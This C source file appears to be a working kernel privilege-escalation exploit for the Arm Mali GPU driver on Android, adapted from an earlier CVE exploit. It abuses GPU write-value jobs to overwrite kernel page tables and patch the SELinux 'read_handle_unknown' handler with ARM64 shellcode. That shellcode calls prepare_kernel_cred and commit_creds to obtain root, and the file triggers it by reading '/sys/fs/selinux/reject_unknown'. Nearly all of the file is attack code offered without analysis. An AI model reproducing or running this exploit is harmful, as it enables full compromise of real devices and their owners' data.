#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include "stdbool.h"
#include <sys/syscall.h>
#include <stdint.h>

#include "mem_write.h"
#include "mempool_utils.h"

#define ADRP_INIT_INDEX 0

#define ADD_INIT_INDEX 1

#define ADRP_COMMIT_INDEX 2

#define ADD_COMMIT_INDEX 3

// void* map_gpu(int mali_fd, unsigned int va_pages, unsigned int commit_pages, bool read_only, int group) {
uint64_t map_gpu(int mali_fd, unsigned int va_pages, unsigned int commit_pages, bool read_only, int group) { // 32bit mod from CVE-38181
  union kbase_ioctl_mem_alloc alloc = {0};
  alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | (group << 22);
  int prot = PROT_READ;
  if (!read_only) {
    alloc.in.flags |= BASE_MEM_PROT_GPU_WR;
    prot |= PROT_WRITE;
  }
  alloc.in.va_pages = va_pages;
  alloc.in.commit_pages = commit_pages;
  mem_alloc(mali_fd, &alloc);
/*
  void* region = mmap(NULL, 0x1000 * va_pages, prot, MAP_SHARED, mali_fd, alloc.out.gpu_va);
  if (region == MAP_FAILED) {
    err(1, "mmap failed");
  }
  return region;
*/
  return alloc.out.gpu_va;
}

static inline uint32_t lo32(uint64_t x) {
  return x & 0xffffffff;
}

static inline uint32_t hi32(uint64_t x) {
  return x >> 32;
}

static uint32_t write_adrp(int rd, uint64_t pc, uint64_t label) {
  uint64_t pc_page = pc >> 12;
  uint64_t label_page = label >> 12;
  int64_t offset = (label_page - pc_page) << 12;
  int64_t immhi_mask = 0xffffe0;
  int64_t immhi = offset >> 14;
  int32_t immlo = (offset >> 12) & 0x3;
  uint32_t adpr = rd & 0x1f;
  adpr |= (1 << 28);
  adpr |= (1 << 31); //op
  adpr |= immlo << 29;
  adpr |= (immhi_mask & (immhi << 5));
  return adpr;
}

/*
void fixup_root_shell(uint64_t init_cred, uint64_t commit_cred, uint64_t read_enforce, uint32_t add_init, uint32_t add_commit, uint32_t* root_code) {

  uint32_t init_adpr = write_adrp(0, read_enforce, init_cred);
  //Sets x0 to init_cred
  root_code[ADRP_INIT_INDEX] = init_adpr;
  root_code[ADD_INIT_INDEX] = add_init;
  //Sets x8 to commit_creds
  root_code[ADRP_COMMIT_INDEX] = write_adrp(8, read_enforce, commit_cred);
  root_code[ADD_COMMIT_INDEX] = add_commit;
  root_code[4] = 0xa9bf7bfd; // stp x29, x30, [sp, #-0x10]
  root_code[5] = 0xd63f0100; // blr x8
  root_code[6] = 0xa8c17bfd; // ldp x29, x30, [sp], #0x10
  root_code[7] = 0xd65f03c0; // ret
}
*/

void fixup_root_shell(uint64_t prepare_cred, uint64_t commit_cred, uint64_t read_handle_unknown, uint32_t add_prepare, uint32_t add_commit, uint32_t* root_code) {
  
  uint32_t prepare_adpr = write_adrp(8, read_handle_unknown, prepare_cred);
  root_code[0] = 0xa9bf7bfd;  	//stp x29, x30, [sp,#-16]!
  root_code[1] = 0xaa1f03e0;  	//mov x0, xzr
  root_code[2] = 0x910003fd;  	//mov x29, sp
  //Sets x8 to prepare_kernel_cred
  root_code[3] = prepare_adpr;	//sets x8 to the actual function address and then call => write_adrp(8 /* x8 */, read_handle_unknown, prepare_kernel_cred /* offset to prepare_kernel_cred */
  root_code[4] = add_prepare;	//add x8, x8, prepare_kernel_cred page offset
  root_code[5] = 0xd63f0100;  	//blr x8
  //Sets x8 to commit_creds
  root_code[6] = write_adrp(8, read_handle_unknown, commit_cred);
  root_code[7] = add_commit;
  root_code[8] = 0xd63f0100;  	//blr x8
  root_code[9] = 0xa8c17bfd;  	//dp x29, x30, [sp],#16
  root_code[10] = 0xd65f03c0; 	//ret
}

static uint64_t set_addr_lv3(uint64_t addr) {
  uint64_t pfn = addr >> PAGE_SHIFT;
  pfn &= ~ 0x1FFUL;
  pfn |= 0x100UL;
  return pfn << PAGE_SHIFT;
}

static inline uint64_t compute_pt_index(uint64_t addr, int level) {
  uint64_t vpfn = addr >> PAGE_SHIFT;
  vpfn >>= (3 - level) * 9;
  return vpfn & 0x1FF;
}

void write_to(int mali_fd, uint64_t gpu_addr, uint64_t value, int atom_number, enum mali_write_value_type type) { // 32bit mod from CVE-38181
//  void* jc_region = map_gpu(mali_fd, 1, 1, false, 0); 
  uint64_t jc_region = map_gpu(mali_fd, 1, 1, false, 0);
  struct MALI_JOB_HEADER jh = {0};
  jh.is_64b = true;
  jh.type = MALI_JOB_TYPE_WRITE_VALUE;
  
  struct MALI_WRITE_VALUE_JOB_PAYLOAD payload = {0};
  payload.type = type;
  payload.immediate_value = value;
  payload.address = gpu_addr;

  uint32_t* section = (uint32_t*)mmap64(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mali_fd, jc_region);
  if (section == MAP_FAILED) {
    err(1, "mmap failed");
  }

//  MALI_JOB_HEADER_pack((uint32_t*)jc_region, &jh);
//  MALI_WRITE_VALUE_JOB_PAYLOAD_pack((uint32_t*)jc_region + 8, &payload);
//  uint32_t* section = (uint32_t*)jc_region;
  MALI_JOB_HEADER_pack((uint32_t*)section, &jh);
  MALI_WRITE_VALUE_JOB_PAYLOAD_pack((uint32_t*)section + 8, &payload);
  struct base_jd_atom_v2 atom = {0};
  atom.jc = (uint64_t)jc_region;
  atom.atom_number = atom_number;
  atom.core_req = BASE_JD_REQ_CS;
  struct kbase_ioctl_job_submit submit = {0};
  submit.addr = (uint64_t)(&atom);
  submit.nr_atoms = 1;
  submit.stride = sizeof(struct base_jd_atom_v2);
  if (ioctl(mali_fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0) {
    err(1, "submit job failed\n");
  }
  usleep(10000);
}

uint8_t write_func(int mali_fd, uint64_t func, uint64_t* reserved, uint64_t size, uint32_t* shellcode, uint64_t code_size, uint64_t reserved_size, uint8_t atom_number) {
//void write_func(int mali_fd, uint64_t func, uint64_t* reserved, uint64_t size, uint32_t* shellcode, uint64_t code_size, uint64_t reserved_size, uint8_t atom_number) {
  uint64_t func_offset = (func + KERNEL_BASE) % 0x1000;
  uint64_t curr_overwrite_addr = 0;
  for (int i = 0; i < size; i++) {
    uint64_t base = reserved[i];
    uint64_t end = reserved[i] + reserved_size * 0x1000;
    uint64_t start_idx = compute_pt_index(base, 3);
    uint64_t end_idx = compute_pt_index(end, 3);
    for (uint64_t addr = base; addr < end; addr += 0x1000) {
      uint64_t overwrite_addr = set_addr_lv3(addr);
      if (curr_overwrite_addr != overwrite_addr) {
//        LOG("overwrite addr : %lx %lx\n", overwrite_addr + func_offset, func_offset);     
        LOG("overwrite addr : %llx %llx\n", overwrite_addr + func_offset, func_offset);
        curr_overwrite_addr = overwrite_addr;
        for (int code = code_size - 1; code >= 0; code--) {
          write_to(mali_fd, overwrite_addr + func_offset + code * 4, shellcode[code], atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);
        }
        usleep(300000);
      }
    }
  }
  return atom_number;
}

uint8_t cleanup(int mali_fd, uint64_t pgd, uint8_t atom_number) {
  write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), 2, atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
  return atom_number;
}

int run_enforce() {
  char result = '2';
  sleep(3);
  int enforce_fd = open("/sys/fs/selinux/reject_unknown", O_RDONLY);	//changed from "/sys/fs/selinux/enforce"
  read(enforce_fd, &result, 1);
  close(enforce_fd);
  LOG("result %d\n", result);
  return result;
}

